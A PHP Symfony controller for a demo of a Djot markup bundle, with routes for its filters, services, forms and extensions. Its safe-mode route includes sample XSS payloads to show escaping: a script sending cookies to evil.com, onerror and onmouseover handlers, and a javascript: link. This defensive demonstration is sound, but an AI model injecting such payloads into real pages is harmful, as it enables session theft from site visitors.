<?php

declare(strict_types=1);

namespace App\Controller;

use App\Entity\Article;
use App\Form\ArticleType;
use PhpCollective\SymfonyDjot\Service\DjotConverterInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\DependencyInjection\Attribute\Autowire;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class DemoController extends AbstractController
{
    private const SAMPLE_DJOT = <<<'DJOT'
# Welcome to Djot

This is a _paragraph_ with *strong emphasis* and _*both combined*_.

## Features

- Clean, consistent syntax
- Task lists: [x] Done, [ ] Todo
- Much more!

> Djot is designed to be easier to parse than Markdown.
> — John MacFarlane

### Code Example

``` php
$html = $djot->toHtml('Hello *world*!');
```

Visit [djot.net](https://djot.net) for more.
DJOT;

    private const USER_CONTENT = <<<'DJOT'
## User Comment

This is _user submitted_ content.

It uses *safe mode* to prevent XSS:

<script>alert('xss')</script>

The script tag above will be escaped.
DJOT;

    #[Route('/', name: 'home')]
    public function index(): Response
    {
        return $this->render('demo/index.html.twig');
    }

    #[Route('/twig-filter', name: 'twig_filter')]
    public function twigFilter(): Response
    {
        return $this->render('demo/twig_filter.html.twig', [
            'djot_content' => self::SAMPLE_DJOT,
            'user_content' => self::USER_CONTENT,
        ]);
    }

    #[Route('/twig-function', name: 'twig_function')]
    public function twigFunction(): Response
    {
        return $this->render('demo/twig_function.html.twig');
    }

    #[Route('/service', name: 'service')]
    public function service(
        DjotConverterInterface $djot,
        #[Autowire(service: 'symfony_djot.converter.user_content')]
        DjotConverterInterface $safeConverter,
    ): Response {
        $html = $djot->toHtml(self::SAMPLE_DJOT);
        $text = $djot->toText(self::SAMPLE_DJOT);

        $safeHtml = $safeConverter->toHtml(self::USER_CONTENT);

        return $this->render('demo/service.html.twig', [
            'html' => $html,
            'text' => $text,
            'safe_html' => $safeHtml,
            'djot_source' => self::SAMPLE_DJOT,
            'user_source' => self::USER_CONTENT,
        ]);
    }

    #[Route('/form', name: 'form')]
    public function form(Request $request, DjotConverterInterface $djot): Response
    {
        $article = new Article();
        $article->setBody(self::SAMPLE_DJOT);

        $form = $this->createForm(ArticleType::class, $article);
        $form->handleRequest($request);

        $preview = null;
        if ($form->isSubmitted() && $form->isValid()) {
            $preview = [
                'title' => $article->getTitle(),
                'body_html' => $djot->toHtml($article->getBody()),
                'comment_html' => $article->getComment() ? $djot->toHtml($article->getComment()) : null,
            ];
        }

        return $this->render('demo/form.html.twig', [
            'form' => $form,
            'preview' => $preview,
        ]);
    }

    #[Route('/safe-mode', name: 'safe_mode')]
    public function safeMode(
        DjotConverterInterface $djot,
        #[Autowire(service: 'symfony_djot.converter.user_content')]
        DjotConverterInterface $safeConverter,
    ): Response {
        $maliciousContent = <<<'DJOT'
# User Post

Normal content here.

<script>document.location='https://evil.com/?cookie='+document.cookie</script>

<img src="x" onerror="alert('XSS')">

<div onmouseover="alert('XSS')">Hover me</div>

[Click me](javascript:alert('XSS'))

More normal content.
DJOT;

        return $this->render('demo/safe_mode.html.twig', [
            'source' => $maliciousContent,
            'unsafe_html' => $djot->toHtml($maliciousContent),
            'safe_html' => $safeConverter->toHtml($maliciousContent),
        ]);
    }

    #[Route('/plain-text', name: 'plain_text')]
    public function plainText(DjotConverterInterface $djot): Response
    {
        return $this->render('demo/plain_text.html.twig', [
            'source' => self::SAMPLE_DJOT,
            'text' => $djot->toText(self::SAMPLE_DJOT),
        ]);
    }

    #[Route('/extensions', name: 'extensions')]
    public function extensions(
        DjotConverterInterface $djot,
        #[Autowire(service: 'symfony_djot.converter.with_mentions')]
        DjotConverterInterface $mentionsConverter,
        #[Autowire(service: 'symfony_djot.converter.with_toc')]
        DjotConverterInterface $tocConverter,
        #[Autowire(service: 'symfony_djot.converter.with_wikilinks')]
        DjotConverterInterface $wikilinksConverter,
        #[Autowire(service: 'symfony_djot.converter.with_default_attrs')]
        DjotConverterInterface $defaultAttrsConverter,
        #[Autowire(service: 'symfony_djot.converter.with_frontmatter')]
        DjotConverterInterface $frontmatterConverter,
        #[Autowire(service: 'symfony_djot.converter.with_semantic')]
        DjotConverterInterface $semanticConverter,
        #[Autowire(service: 'symfony_djot.converter.with_code_group')]
        DjotConverterInterface $codeGroupConverter,
    ): Response {
        // Autolink demo
        $autolinkSource = <<<'DJOT'
Check out https://djot.net for more info.

Email us at hello@example.com for support.
DJOT;

        // External links demo
        $externalLinksSource = <<<'DJOT'
Visit [our site](https://example.com) (internal) or [GitHub](https://github.com) (external).
DJOT;

        // Smart quotes demo
        $smartQuotesSource = <<<'DJOT'
He said "Hello, world!" and she replied 'How are you?'

It's a beautiful day -- don't you think?
DJOT;

        // Heading permalinks demo
        $headingPermalinksSource = <<<'DJOT'
# Introduction

Some intro text.

## Getting Started

More content here.

### Installation

Install instructions.
DJOT;

        // Mentions demo
        $mentionsSource = <<<'DJOT'
Thanks @dereuromark for the review!

Also cc @jmacfarlane for the original Djot spec.
DJOT;

        // TOC demo
        $tocSource = <<<'DJOT'
{toc}

# Chapter 1

Content for chapter 1.

## Section 1.1

Subsection content.

## Section 1.2

More content.

# Chapter 2

Chapter 2 content.
DJOT;

        // Wikilinks demo
        $wikilinksSource = <<<'DJOT'
See [[Home]] for the main page.

Related: [[Getting Started]] and [[API Reference]].
DJOT;

        // Default attributes demo
        $defaultAttrsSource = <<<'DJOT'
Here's an image:

![Photo](https://via.placeholder.com/150)

And a table:

| Name | Role |
|------|------|
| Alice | Admin |
| Bob | User |

A [link](https://example.com) with default class.
DJOT;

        // Frontmatter demo
        $frontmatterSource = <<<'DJOT'
---yaml
title: My Document
author: John Doe
date: 2025-01-15
---

# Document Title

This content has YAML frontmatter.
DJOT;

        // Semantic span demo
        $semanticSource = <<<'DJOT'
Press [Ctrl+C]{kbd} to copy.

The term [API]{dfn="Application Programming Interface"} is important.

[HTML]{abbr="HyperText Markup Language"} is the foundation of the web.
DJOT;

        // Code group demo
        $codeGroupSource = <<<'DJOT'
::: code-group
``` php [Composer]
composer require php-collective/djot
```

``` bash [NPM]
npm install @example/djot
```

``` yaml [Docker]
services:
  app:
    image: php:8.2
```
:::
DJOT;

        return $this->render('demo/extensions.html.twig', [
            'autolink_source' => $autolinkSource,
            'autolink_html' => $djot->toHtml($autolinkSource),
            'external_links_source' => $externalLinksSource,
            'external_links_html' => $djot->toHtml($externalLinksSource),
            'smart_quotes_source' => $smartQuotesSource,
            'smart_quotes_html' => $djot->toHtml($smartQuotesSource),
            'heading_permalinks_source' => $headingPermalinksSource,
            'heading_permalinks_html' => $djot->toHtml($headingPermalinksSource),
            'mentions_source' => $mentionsSource,
            'mentions_html' => $mentionsConverter->toHtml($mentionsSource),
            'toc_source' => $tocSource,
            'toc_html' => $tocConverter->toHtml($tocSource),
            'wikilinks_source' => $wikilinksSource,
            'wikilinks_html' => $wikilinksConverter->toHtml($wikilinksSource),
            'default_attrs_source' => $defaultAttrsSource,
            'default_attrs_html' => $defaultAttrsConverter->toHtml($defaultAttrsSource),
            'frontmatter_source' => $frontmatterSource,
            'frontmatter_html' => $frontmatterConverter->toHtml($frontmatterSource),
            'semantic_source' => $semanticSource,
            'semantic_html' => $semanticConverter->toHtml($semanticSource),
            'code_group_source' => $codeGroupSource,
            'code_group_html' => $codeGroupConverter->toHtml($codeGroupSource),
        ]);
    }
}
